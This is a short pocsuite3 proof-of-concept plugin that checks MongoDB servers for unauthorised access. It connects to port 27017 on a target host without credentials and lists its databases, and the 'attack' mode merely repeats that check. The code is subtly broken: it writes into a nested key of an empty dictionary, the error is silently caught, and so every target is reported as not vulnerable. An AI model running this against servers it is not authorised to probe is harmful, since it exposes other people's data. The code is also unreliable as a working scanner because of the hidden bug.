# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, OptString, POC_CATEGORY
from urllib.parse import urlparse
import pymongo

class DemoPOC(POCBase):
    vulID = ""
    version ='1'
    author = ["LMX"]
    vulDate = ""
    createDate = "2022-2-15"
    updateDate = "2022-2-15"
    references =[]
    name ="Mongodb 未授权访问"
    appPowerLink = ''
    appName = 'Mongodb'
    appVersion = ' '
    vulType = '未授权访问'
    desc = '''
    Mongodb 未授权访问漏洞
    '''

    def _verify(self):
        result ={}
        pr = urlparse(self.url)
        try:
            conn = pymongo.MongoClient(pr.hostname, 27017, socketTimeoutMS=4000)
            dbname = conn.list_database_names()
            result['VerifyInfo']['URL'] = dbname
            conn.close()
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()
register_poc(DemoPOC)